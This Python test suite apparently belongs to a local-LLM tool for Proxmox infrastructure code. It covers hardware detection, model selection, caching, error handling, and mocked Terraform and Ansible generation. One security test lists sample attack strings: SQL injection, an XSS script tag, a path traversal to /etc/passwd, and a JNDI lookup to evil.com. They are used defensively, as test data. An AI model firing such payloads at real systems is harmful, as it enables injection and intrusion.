"""
Comprehensive Local AI Functionality Test Suite.

Tests hardware detection, model management, memory optimization,
and IaC code generation capabilities with security validation.
"""

import pytest
import asyncio
import json
import time
import psutil
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from dataclasses import asdict

from src.proxmox_ai.ai.local_ai_client import (
    OptimizedLocalAIClient, 
    AIResponse, 
    HardwareOptimizedSkillManager
)
from src.proxmox_ai.core.hardware_detector import (
    hardware_detector, 
    HardwareSpecs, 
    ModelRecommendation
)
from src.proxmox_ai.core.model_manager import (
    EfficientModelManager,
    ModelInfo,
    ModelPerformance
)


class TestHardwareDetection:
    """Test hardware detection and optimization functionality."""
    
    def test_hardware_specs_detection(self):
        """Test that hardware specifications are properly detected."""
        specs = hardware_detector.specs
        
        # Verify all required fields are present
        assert isinstance(specs.total_memory_gb, float)
        assert specs.total_memory_gb > 0
        assert isinstance(specs.available_memory_gb, float)
        assert specs.available_memory_gb > 0
        assert isinstance(specs.cpu_cores, int)
        assert specs.cpu_cores > 0
        assert isinstance(specs.cpu_model, str)
        assert len(specs.cpu_model) > 0
        assert isinstance(specs.gpu_available, bool)
        assert isinstance(specs.gpu_memory_gb, float)
        assert specs.gpu_memory_gb >= 0
        assert isinstance(specs.architecture, str)
        assert isinstance(specs.platform_system, str)
    
    def test_model_recommendation_logic(self):
        """Test model recommendation based on hardware specs."""
        recommendation = hardware_detector.get_optimal_model_config()
        
        # Verify recommendation structure
        assert isinstance(recommendation, ModelRecommendation)
        assert recommendation.model_name
        assert recommendation.model_size
        assert recommendation.memory_usage_gb > 0
        assert recommendation.quantization in ["Q4_0", "Q4_K_M", "Q8_0"]
        assert recommendation.inference_engine == "llama.cpp"
        assert recommendation.max_context_length > 0
        assert recommendation.expected_performance in ["Basic", "Medium", "High"]
        
        # Verify memory constraints are respected
        available_memory = hardware_detector.specs.available_memory_gb
        assert recommendation.memory_usage_gb <= available_memory
    
    def test_runtime_config_optimization(self):
        """Test runtime configuration optimization for current hardware."""
        config = hardware_detector.get_runtime_config()
        
        # Verify all required config keys
        required_keys = [
            "model", "quantization", "max_context_length", "cpu_threads",
            "memory_map", "use_gpu", "batch_size", "temperature", "top_p",
            "timeout", "cache_enabled", "stream_response"
        ]
        
        for key in required_keys:
            assert key in config, f"Missing required config key: {key}"
        
        # Verify sensible defaults
        assert config["cpu_threads"] <= hardware_detector.specs.cpu_cores
        assert config["cpu_threads"] >= 1
        assert 0.0 <= config["temperature"] <= 1.0
        assert 0.0 <= config["top_p"] <= 1.0
        assert config["timeout"] > 0
        assert isinstance(config["cache_enabled"], bool)
        assert isinstance(config["memory_map"], bool)
        assert isinstance(config["use_gpu"], bool)
    
    def test_model_compatibility_validation(self):
        """Test model compatibility validation against hardware."""
        # Test various model sizes
        test_models = [
            "tinyllama:1.1b-chat-q4_0",
            "deepseek-coder:1.3b-instruct-q4_K_M", 
            "codellama:7b-instruct-q4_0",
            "codellama:13b-instruct-q4_K_M"
        ]
        
        for model in test_models:
            is_compatible = hardware_detector.validate_model_compatibility(model)
            assert isinstance(is_compatible, bool)
    
    def test_performance_profile_generation(self):
        """Test performance profile generation."""
        profile = hardware_detector.get_performance_profile()
        
        # Verify profile structure
        required_keys = [
            "inference_speed", "model_quality", "memory_usage", 
            "context_window", "recommended_use"
        ]
        
        for key in required_keys:
            assert key in profile, f"Missing profile key: {key}"
        
        assert profile["inference_speed"] in ["Fast", "Medium", "Slow"]
        assert profile["model_quality"] in ["Basic", "Medium", "High"]
        assert "GB" in profile["memory_usage"]
        assert "tokens" in profile["context_window"]
    
    def test_resource_monitoring(self):
        """Test real-time resource monitoring."""
        usage = hardware_detector.monitor_resource_usage()
        
        # Verify monitoring data
        assert "memory_used_percent" in usage
        assert "memory_available_gb" in usage
        assert "cpu_usage_percent" in usage
        assert "load_average" in usage
        
        # Verify data ranges
        assert 0 <= usage["memory_used_percent"] <= 100
        assert usage["memory_available_gb"] >= 0
        assert 0 <= usage["cpu_usage_percent"] <= 100
        assert usage["load_average"] >= 0


class TestModelManager:
    """Test efficient model management functionality."""
    
    def test_model_catalog_initialization(self):
        """Test model catalog contains expected models."""
        manager = EfficientModelManager()
        
        # Verify catalog structure
        assert hasattr(manager, 'model_catalog')
        assert len(manager.model_catalog) > 0
        
        # Check for expected lightweight models
        expected_models = [
            "tinyllama:1.1b-chat-q4_0",
            "deepseek-coder:1.3b-instruct-q4_K_M",
            "codellama:7b-instruct-q4_0"
        ]
        
        for model_name in expected_models:
            assert model_name in manager.model_catalog
            model_info = manager.model_catalog[model_name]
            assert isinstance(model_info, ModelInfo)
            assert model_info.size_gb > 0
            assert model_info.performance_score > 0
    
    @pytest.mark.asyncio
    async def test_optimal_model_selection(self):
        """Test optimal model selection based on hardware."""
        manager = EfficientModelManager()
        optimal_model = await manager.get_optimal_model()
        
        # Verify optimal model selection
        assert isinstance(optimal_model, ModelInfo)
        assert optimal_model.size_gb <= hardware_detector.specs.available_memory_gb * 0.8
        assert optimal_model.performance_score > 0
    
    def test_model_recommendations(self):
        """Test model recommendation system."""
        manager = EfficientModelManager()
        recommendations = manager.get_model_recommendations()
        
        # Verify recommendations
        assert isinstance(recommendations, list)
        assert len(recommendations) <= 3  # Top 3 recommendations
        
        for rec in recommendations:
            assert isinstance(rec, ModelInfo)
            assert rec.size_gb <= hardware_detector.specs.available_memory_gb * 0.9
    
    def test_memory_usage_estimation(self):
        """Test memory usage estimation for models."""
        manager = EfficientModelManager()
        
        test_cases = [
            ("tinyllama:1.1b-chat-q4_0", 1.5),
            ("codellama:7b-instruct-q4_0", 4.0),
            ("unknown-model:1.3b", 1.5)
        ]
        
        for model_name, expected_min in test_cases:
            estimated = manager.get_memory_usage_estimate(model_name)
            assert estimated >= expected_min
    
    def test_system_status_reporting(self):
        """Test system status reporting."""
        manager = EfficientModelManager()
        status = manager.get_system_status()
        
        # Verify status structure
        required_keys = [
            "hardware", "loaded_models", "recommended_model", 
            "cache_count", "performance_records"
        ]
        
        for key in required_keys:
            assert key in status
        
        assert isinstance(status["loaded_models"], list)
        assert isinstance(status["cache_count"], int)
        assert isinstance(status["performance_records"], int)


class TestLocalAIClient:
    """Test optimized local AI client functionality."""
    
    def test_client_initialization(self):
        """Test AI client initialization with hardware optimization."""
        client = OptimizedLocalAIClient()
        
        # Verify initialization
        assert hasattr(client, 'hardware_config')
        assert hasattr(client, 'model_name')
        assert hasattr(client, 'skill_levels')
        assert hasattr(client, 'context_cache')
        
        # Verify hardware configuration loaded
        assert client.hardware_config is not None
        assert "model" in client.hardware_config
        assert "cpu_threads" in client.hardware_config
        assert "max_context_length" in client.hardware_config
    
    def test_skill_level_configuration(self):
        """Test skill level adaptation based on hardware."""
        client = OptimizedLocalAIClient()
        
        # Verify skill levels
        expected_levels = ["beginner", "intermediate", "expert"]
        for level in expected_levels:
            assert level in client.skill_levels
            config = client.skill_levels[level]
            assert "description" in config
            assert "max_tokens" in config
            assert "temperature" in config
            assert "complexity" in config
            assert config["max_tokens"] > 0
            assert 0 <= config["temperature"] <= 1
    
    def test_cache_functionality(self):
        """Test response caching system."""
        client = OptimizedLocalAIClient()
        
        # Test cache key generation
        key = client._get_cache_key("test prompt", "intermediate")
        assert isinstance(key, str)
        assert len(key) == 16  # MD5 hash truncated to 16 chars
        
        # Test cache operations
        test_key = "test_key"
        test_response = "test response"
        
        # Initially empty
        assert client._check_cache(test_key) is None
        
        # Add to cache
        client._update_cache(test_key, test_response)
        assert client._check_cache(test_key) == test_response
        
        # Clear cache
        client.clear_cache()
        assert client._check_cache(test_key) is None
    
    @pytest.mark.asyncio
    async def test_availability_check(self):
        """Test local AI model availability check."""
        client = OptimizedLocalAIClient()
        
        # Mock successful availability check
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                "models": [{"name": "test-model:latest"}]
            }
            mock_get.return_value = mock_response
            
            is_available = await client.is_available()
            assert isinstance(is_available, bool)
    
    def test_performance_statistics(self):
        """Test performance statistics tracking."""
        client = OptimizedLocalAIClient()
        
        # Initial stats
        stats = client.get_performance_stats()
        assert "total_requests" in stats
        assert "cache_hits" in stats
        assert "cache_hit_rate" in stats
        assert "avg_processing_time" in stats
        assert "model_name" in stats
        assert "hardware_config" in stats
        
        # Verify initial values
        assert stats["total_requests"] == 0
        assert stats["cache_hits"] == 0
        assert stats["cache_hit_rate"] == 0.0
        assert stats["avg_processing_time"] == 0.0
    
    def test_model_info_retrieval(self):
        """Test model information retrieval."""
        client = OptimizedLocalAIClient()
        model_info = client.get_model_info()
        
        # Verify model info structure
        required_keys = [
            "current_model", "recommended_model", "model_size",
            "quantization", "memory_usage_gb", "performance_profile",
            "skill_levels"
        ]
        
        for key in required_keys:
            assert key in model_info
        
        assert isinstance(model_info["skill_levels"], list)
        assert len(model_info["skill_levels"]) == 3


class TestSkillManager:
    """Test hardware-optimized skill management."""
    
    def test_skill_manager_initialization(self):
        """Test skill manager initialization."""
        manager = HardwareOptimizedSkillManager()
        
        # Verify initialization
        assert hasattr(manager, 'hardware_specs')
        assert hasattr(manager, 'performance_profile')
        assert hasattr(manager, 'templates')
        
        # Verify templates loaded
        assert isinstance(manager.templates, dict)
        skill_levels = ["beginner", "intermediate", "expert"]
        for level in skill_levels:
            assert level in manager.templates
    
    def test_template_retrieval(self):
        """Test template retrieval for different skill levels."""
        manager = HardwareOptimizedSkillManager()
        
        # Test template retrieval
        template = manager.get_template("beginner", "vm_basic")
        assert isinstance(template, dict)
        
        # Test non-existent template
        empty_template = manager.get_template("expert", "non_existent")
        assert isinstance(empty_template, dict)
    
    def test_optimal_skill_level_selection(self):
        """Test optimal skill level selection based on hardware."""
        manager = HardwareOptimizedSkillManager()
        
        test_cases = ["beginner", "intermediate", "expert"]
        for user_level in test_cases:
            optimal = manager.get_optimal_skill_level(user_level)
            assert optimal in ["beginner", "intermediate", "expert"]


class TestMemoryOptimization:
    """Test memory optimization and efficiency."""
    
    def test_memory_usage_under_threshold(self):
        """Test that memory usage stays under 3GB threshold."""
        # Get initial memory usage
        initial_memory = psutil.virtual_memory().used
        
        # Initialize AI client (should load minimal components)
        client = OptimizedLocalAIClient()
        
        # Check memory increase
        current_memory = psutil.virtual_memory().used
        memory_increase = (current_memory - initial_memory) / (1024**3)  # Convert to GB
        
        # Should stay well under 3GB for initialization
        assert memory_increase < 0.5, f"Memory increase {memory_increase:.2f}GB exceeds threshold"
    
    def test_cache_size_limits(self):
        """Test that cache respects size limits."""
        client = OptimizedLocalAIClient()
        
        # Fill cache beyond limit
        for i in range(60):  # More than max_cache_size (50)
            client._update_cache(f"key_{i}", f"response_{i}")
        
        # Verify cache size is limited
        assert len(client.context_cache) <= 50
    
    def test_hardware_config_efficiency(self):
        """Test that hardware configuration optimizes for efficiency."""
        config = hardware_detector.get_runtime_config()
        
        # Verify efficiency settings
        assert config["batch_size"] == 1  # Small batch for responsiveness
        assert config["cpu_threads"] <= 4  # Capped for efficiency
        assert config["timeout"] <= 30  # Reasonable timeout
        assert config["stream_response"] is False  # Disabled for CLI usage


class TestErrorHandling:
    """Test error handling and resilience."""
    
    @pytest.mark.asyncio
    async def test_unavailable_model_handling(self):
        """Test handling when local AI model is unavailable."""
        client = OptimizedLocalAIClient()
        
        # Mock unavailable service
        with patch.object(client, 'is_available', return_value=False):
            response = await client._make_optimized_request("test prompt", "intermediate")
            
            assert isinstance(response, AIResponse)
            assert not response.success
            assert "not available" in response.content.lower()
            assert response.processing_time == 0.0
            assert response.tokens_generated == 0
    
    @pytest.mark.asyncio
    async def test_network_error_handling(self):
        """Test handling of network errors."""
        client = OptimizedLocalAIClient()
        
        # Mock network error
        with patch('requests.post', side_effect=Exception("Network error")):
            with patch.object(client, 'is_available', return_value=True):
                response = await client._make_optimized_request("test prompt", "intermediate")
                
                assert isinstance(response, AIResponse)
                assert not response.success
                assert "Network error" in response.content
    
    def test_invalid_skill_level_handling(self):
        """Test handling of invalid skill levels."""
        client = OptimizedLocalAIClient()
        
        # Test with invalid skill level - should fallback to intermediate
        skill_config = client.skill_levels.get("invalid_level", client.skill_levels["intermediate"])
        assert skill_config == client.skill_levels["intermediate"]


class TestSecurityValidation:
    """Test security aspects of local AI implementation."""
    
    def test_no_hardcoded_secrets(self):
        """Test that no hardcoded secrets are present."""
        client = OptimizedLocalAIClient()
        
        # Check client attributes for hardcoded values
        sensitive_patterns = ["password", "secret", "key", "token"]
        client_dict = client.__dict__
        
        for attr_name, attr_value in client_dict.items():
            if isinstance(attr_value, str):
                for pattern in sensitive_patterns:
                    assert pattern not in attr_name.lower(), f"Potentially sensitive attribute: {attr_name}"
    
    def test_local_only_dependencies(self):
        """Test that the system has no cloud API dependencies when using local AI."""
        client = OptimizedLocalAIClient()
        
        # Verify local-only configuration
        assert client.ollama_host.startswith("http://localhost") or client.ollama_host.startswith("http://127.0.0.1")
        
        # Verify no external API keys required for local operation  
        model_info = client.get_model_info()
        assert "current_model" in model_info  # Should work without external credentials
    
    def test_input_sanitization(self):
        """Test input sanitization for prompts."""
        client = OptimizedLocalAIClient()
        
        # Test potentially malicious inputs
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com}"
        ]
        
        for malicious_input in malicious_inputs:
            cache_key = client._get_cache_key(malicious_input, "intermediate")
            # Should generate cache key without errors
            assert isinstance(cache_key, str)
            assert len(cache_key) == 16
    
    def test_resource_limits(self):
        """Test that resource limits are enforced."""
        client = OptimizedLocalAIClient()
        
        # Verify timeout limits
        assert client.hardware_config.get("timeout", 0) > 0
        assert client.hardware_config.get("timeout", 0) <= 60  # Reasonable upper limit
        
        # Verify memory constraints
        for skill_level, config in client.skill_levels.items():
            assert config["max_tokens"] > 0
            assert config["max_tokens"] <= 8192  # Reasonable upper limit


# Integration test fixtures
@pytest.fixture
def mock_ollama_response():
    """Mock Ollama API response."""
    return {
        "response": "# Example Terraform Configuration\n\nresource \"proxmox_vm_qemu\" \"test\" {\n  name = \"test-vm\"\n  memory = 2048\n  cores = 2\n}",
        "done": True,
        "context": [1, 2, 3],
        "total_duration": 1500000000,
        "load_duration": 500000000,
        "prompt_eval_count": 50,
        "prompt_eval_duration": 200000000,
        "eval_count": 100,
        "eval_duration": 800000000
    }


@pytest.mark.asyncio
class TestIntegration:
    """Integration tests for complete workflows."""
    
    async def test_terraform_generation_workflow(self, mock_ollama_response):
        """Test complete Terraform generation workflow."""
        client = OptimizedLocalAIClient()
        
        with patch('requests.get') as mock_get, \
             patch('requests.post') as mock_post:
            
            # Mock availability check
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {
                "models": [{"name": client.model_name}]
            }
            
            # Mock generation request
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = mock_ollama_response
            
            # Test generation
            response = await client.generate_terraform_config(
                "Create a VM with 2GB RAM and 2 CPU cores",
                skill_level="intermediate"
            )
            
            assert isinstance(response, AIResponse)
            assert response.success
            assert "resource" in response.content
            assert "proxmox" in response.content.lower()
            assert response.processing_time > 0
            assert response.tokens_generated > 0
    
    async def test_ansible_generation_workflow(self, mock_ollama_response):
        """Test complete Ansible generation workflow."""
        client = OptimizedLocalAIClient()
        
        with patch('requests.get') as mock_get, \
             patch('requests.post') as mock_post:
            
            # Mock availability check
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {
                "models": [{"name": client.model_name}]
            }
            
            # Mock generation request
            ansible_response = mock_ollama_response.copy()
            ansible_response["response"] = "---\n- hosts: all\n  tasks:\n    - name: Install package\n      apt:\n        name: nginx\n        state: present"
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = ansible_response
            
            # Test generation
            response = await client.generate_ansible_playbook(
                "Install nginx on all servers",
                skill_level="beginner"
            )
            
            assert isinstance(response, AIResponse)
            assert response.success
            assert "hosts:" in response.content
            assert "tasks:" in response.content
            assert "nginx" in response.content.lower()
    
    async def test_optimization_workflow(self, mock_ollama_response):
        """Test infrastructure optimization workflow."""
        client = OptimizedLocalAIClient()
        
        test_config = """
        resource "proxmox_vm_qemu" "web" {
          name = "web-server"
          memory = 1024
          cores = 1
        }
        """
        
        with patch('requests.get') as mock_get, \
             patch('requests.post') as mock_post:
            
            # Mock availability check
            mock_get.return_value.status_code = 200
            mock_get.return_value.json.return_value = {
                "models": [{"name": client.model_name}]
            }
            
            # Mock optimization request
            optimization_response = mock_ollama_response.copy()
            optimization_response["response"] = "Optimization recommendations:\n1. Increase memory to 2GB\n2. Add backup configuration\n3. Enable monitoring"
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = optimization_response
            
            # Test optimization
            response = await client.optimize_infrastructure(
                test_config,
                skill_level="expert"
            )
            
            assert isinstance(response, AIResponse)
            assert response.success
            assert "optimization" in response.content.lower()
            assert len(response.content) > 50


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])